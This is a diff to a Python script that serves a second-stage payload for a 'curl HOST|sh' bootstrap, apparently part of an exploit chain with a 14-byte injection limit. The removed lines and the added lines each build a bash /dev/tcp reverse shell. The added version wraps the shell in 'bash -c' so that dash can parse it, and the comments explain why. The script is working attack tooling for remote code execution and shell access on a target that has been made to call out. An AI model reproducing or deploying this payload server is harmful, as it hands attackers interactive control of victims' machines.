@@ -16,10 +16,12 @@ both work) and logs each fetch (your confirmation that the target called out).
 import argparse, http.server, socketserver, datetime, sys
 
 def revshell(host, port):
-    # bash /dev/tcp reverse shell (arbitrary length — no 14-byte limit at stage 2)
-    return (f"#!/bin/sh\n"
-            f"exec 5<>/dev/tcp/{host}/{port}\n"
-            f"cat <&5 | while read line; do $line 2>&5 >&5; done\n")
+    # Interactive bash reverse shell. The 14-byte stage-1 bootstrap is `curl
+    # HOST|sh`, so the outer shell parsing this payload is dash on Debian.
+    # Both `/dev/tcp/HOST/PORT` and `>&` are bash-only, so dash must not try
+    # to parse the redirect itself: we hand the whole thing to `bash -c` as
+    # one quoted string, which bash then parses correctly.
+    return f"exec /bin/bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'\n"
 
 def main():
     ap = argparse.ArgumentParser(description="host stage-2 payload for curl|sh bootstrap")
